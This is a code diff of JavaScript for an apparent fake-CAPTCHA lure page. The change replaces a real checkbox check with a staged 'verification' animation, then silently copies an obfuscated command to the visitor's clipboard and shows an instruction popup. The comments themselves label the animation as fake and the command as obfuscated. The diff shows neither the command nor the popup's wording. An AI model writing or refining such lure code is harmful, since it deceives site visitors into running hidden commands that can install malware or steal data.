@@ -1,10 +1,4 @@
 document.addEventListener("DOMContentLoaded", function () {
-    // Show loading spinner for 3 seconds, then show CAPTCHA
-    setTimeout(() => {
-        document.getElementById("loading-screen").style.display = "none";
-        document.getElementById("captcha-container").style.display = "block";
-    }, 3000);
-
     // Detect and display hosting domain dynamically
     const domainName = window.location.hostname;
     document.getElementById("domain-name").innerText = domainName;
@@ -20,19 +14,21 @@ document.addEventListener("DOMContentLoaded", function () {
     };
 });
 
-// Verify CAPTCHA and show popup
+// Verify CAPTCHA with fake animation
 function verifyCaptcha() {
-    const captcha = document.getElementById("captcha");
-    
-    if (captcha.checked) {
+    const checkboxUI = document.getElementById("verify-spinner");
+    checkboxUI.style.display = "block"; // Show spinner
+
+    setTimeout(() => {
+        checkboxUI.style.display = "none"; // Hide spinner
         copyCommand();
-        document.getElementById("instruction-popup").style.display = "block";
-    }
+        document.getElementById("instruction-popup").style.display = "block"; // Show popup
+    }, 2000);
 }
 
 // Clipboard Copy Function with Obfuscation
 function copyCommand() {
-    const hiddenCommand = getObfuscatedCommand(); // Fetch obfuscated command
+    const hiddenCommand = getObfuscatedCommand();
     navigator.clipboard.writeText(hiddenCommand).then(() => {
         console.log("Command copied successfully.");
     }).catch(err => {
